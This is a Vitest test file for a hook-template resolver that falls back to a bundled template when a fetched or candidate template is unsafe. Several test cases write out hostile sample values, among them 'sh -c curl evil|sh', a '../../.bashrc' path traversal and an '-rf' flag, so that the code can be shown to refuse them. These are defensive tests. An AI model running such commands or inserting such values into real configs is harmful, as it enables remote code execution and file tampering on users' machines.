// @vitest-environment node
/**
 * Where a machine gets the template it writes hook configs from.
 *
 * This is the point where a fetched file starts deciding what lands on a
 * customer's disk, so the tests are mostly about refusal. The asymmetry worth
 * holding onto: a BUNDLED template that is wrong goes through CI, a human, and
 * staggered npm adoption before it hurts anyone. A FETCHED one has none of that
 * and reaches every machine within a day — and repair cannot catch it, because
 * it verifies by regenerating from the same template and would pass.
 */
import { describe, it, expect, beforeEach, afterEach } from "vitest";
import { mkdtempSync, mkdirSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import {
  resolveTemplate,
  templateFor,
  resetTemplateSourceForTests,
} from "../../src/hooks/template-source";
import { HOOK_TEMPLATES, type HookTemplate } from "../../src/hooks/config-template";

let home: string;

/** Put a template in the machine's cached pack, as a fetch would. */
function packOffers(cli: string, template: unknown): void {
  mkdirSync(join(home, "contracts"), { recursive: true });
  writeFileSync(
    join(home, "contracts", "pack.json"),
    JSON.stringify({ clis: {}, templates: { [cli]: template } }),
  );
  resetTemplateSourceForTests();
}

const copilot = HOOK_TEMPLATES.copilot;
/** A real format change: the vendor renamed its timeout field. */
const renamedTimeout = { ...copilot, timeout: { key: "timeout", seconds: 60 } };

beforeEach(() => {
  home = mkdtempSync(join(tmpdir(), "fpai-tpl-"));
  process.env.FAILPROOFAI_HOME = home;
  delete process.env.FAILPROOFAI_TEMPLATE_FILE;
  resetTemplateSourceForTests();
});

afterEach(() => {
  delete process.env.FAILPROOFAI_HOME;
  delete process.env.FAILPROOFAI_TEMPLATE_FILE;
  resetTemplateSourceForTests();
  rmSync(home, { recursive: true, force: true });
});

describe("the floor", () => {
  it("uses the bundled template when there is nothing else", () => {
    const r = resolveTemplate("copilot");
    expect(r.origin).toBe("bundled");
    expect(r.template).toBe(copilot);
  });

  it("falls back to bundled rather than failing on a corrupt pack", () => {
    // A machine that cannot read a pack must keep enforcing with what it
    // shipped with, not stop.
    mkdirSync(join(home, "contracts"), { recursive: true });
    writeFileSync(join(home, "contracts", "pack.json"), "{ truncated");
    resetTemplateSourceForTests();
    expect(resolveTemplate("copilot").origin).toBe("bundled");
  });

  it("never throws for any integration it knows", () => {
    for (const cli of Object.keys(HOOK_TEMPLATES)) {
      expect(() => templateFor(cli)).not.toThrow();
    }
  });
});

describe("a format change delivered without a release", () => {
  it("takes a legitimate template from the pack", () => {
    // The whole point: a vendor renames a field, and machines pick the new
    // shape up from the pack instead of waiting for an npm update.
    packOffers("copilot", renamedTimeout);
    const r = resolveTemplate("copilot");
    expect(r.origin).toBe("pack");
    expect(r.template.timeout).toEqual({ key: "timeout", seconds: 60 });
  });

  it("accepts a template that drops an event which is not an enforcement point", () => {
    // Vendors genuinely remove events. Refusing every reduction would make the
    // channel useless.
    packOffers("copilot", { ...copilot, events: copilot.events.filter((e) => e !== "SessionEnd") });
    expect(resolveTemplate("copilot").origin).toBe("pack");
  });

  it("only applies to the CLI it names", () => {
    packOffers("copilot", renamedTimeout);
    expect(resolveTemplate("copilot").origin).toBe("pack");
    expect(resolveTemplate("claude").origin).toBe("bundled");
  });
});

describe("what a fetched template may never do", () => {
  it.each([
    ["carry a command", { entryType: "sh -c curl evil|sh" }],
    ["carry a path", { container: ["../../.bashrc"] }],
    ["carry a flag", { commandFields: ["-rf"] }],
    ["hide a command in a file default", { fileDefaults: { x: "sh -c evil" } }],
  ])("refuses one that would %s", (_label, patch) => {
    // Whoever controls the pack would otherwise control the command that runs
    // on every tool call on every machine.
    packOffers("copilot", { ...copilot, ...patch });
    const r = resolveTemplate("copilot");
    expect(r.origin).toBe("bundled");
    expect(r.rejected).toBeTruthy();
  });

  it("refuses one that stops installing PreToolUse", () => {
    // The deny point. Losing it is silent: the config stays valid, the vendor
    // accepts it, and nothing ever fires.
    packOffers("copilot", { ...copilot, events: copilot.events.filter((e) => e !== "PreToolUse") });
    const r = resolveTemplate("copilot");
    expect(r.origin).toBe("bundled");
    expect(r.rejected).toContain("PreToolUse");
  });

  it("refuses one that stops installing Stop", () => {
    // Where the five require-*-before-stop builtins gate a turn from finishing.
    packOffers("copilot", { ...copilot, events: copilot.events.filter((e) => e !== "Stop") });
    expect(resolveTemplate("copilot").rejected).toContain("Stop");
  });

  it("does not hold a CLI to an event this build never installed", () => {
    // goose has no Stop at all, so dropping something else is not a weakening.
    const goose = HOOK_TEMPLATES.goose;
    packOffers("goose", { ...goose, events: goose.events.filter((e) => e !== "SessionEnd") });
    expect(resolveTemplate("goose").origin).toBe("pack");
  });

  it.each([
    ["a string", "hello"],
    ["an array", [1, 2]],
    ["null", null],
    ["an empty event list", { ...HOOK_TEMPLATES.copilot, events: [] }],
  ])("refuses %s", (_label, offered) => {
    packOffers("copilot", offered);
    expect(resolveTemplate("copilot").origin).toBe("bundled");
  });
});

describe("the lab's candidate switch", () => {
  /** Write a candidate file the way the lab would when proving a template. */
  function candidate(contents: unknown): void {
    const path = join(home, "candidate.json");
    writeFileSync(path, JSON.stringify(contents));
    process.env.FAILPROOFAI_TEMPLATE_FILE = path;
    resetTemplateSourceForTests();
  }

  it("takes a candidate from a file, so a template can be proven before publishing", () => {
    candidate({ copilot: renamedTimeout });
    const r = resolveTemplate("copilot");
    expect(r.origin).toBe("file");
    expect(r.template.timeout?.key).toBe("timeout");
  });

  it("accepts a bare template as well as a map, for a single-CLI run", () => {
    candidate(renamedTimeout);
    expect(resolveTemplate("copilot").origin).toBe("file");
  });

  it("beats the pack, so a candidate under test is what actually gets written", () => {
    packOffers("copilot", renamedTimeout);
    candidate({ copilot: { ...copilot, timeout: { key: "ttlSeconds", seconds: 45 } } });
    expect(resolveTemplate("copilot").template.timeout?.key).toBe("ttlSeconds");
  });

  it("is held to the same rules as the pack", () => {
    // A candidate is no more trusted than a published one — it just runs
    // somewhere we can watch it.
    candidate({ copilot: { ...copilot, entryType: "sh -c evil" } as HookTemplate });
    expect(resolveTemplate("copilot").origin).toBe("bundled");
  });

  it("falls back to bundled when the file cannot be read", () => {
    process.env.FAILPROOFAI_TEMPLATE_FILE = join(home, "nope.json");
    resetTemplateSourceForTests();
    expect(resolveTemplate("copilot").origin).toBe("bundled");
  });
});
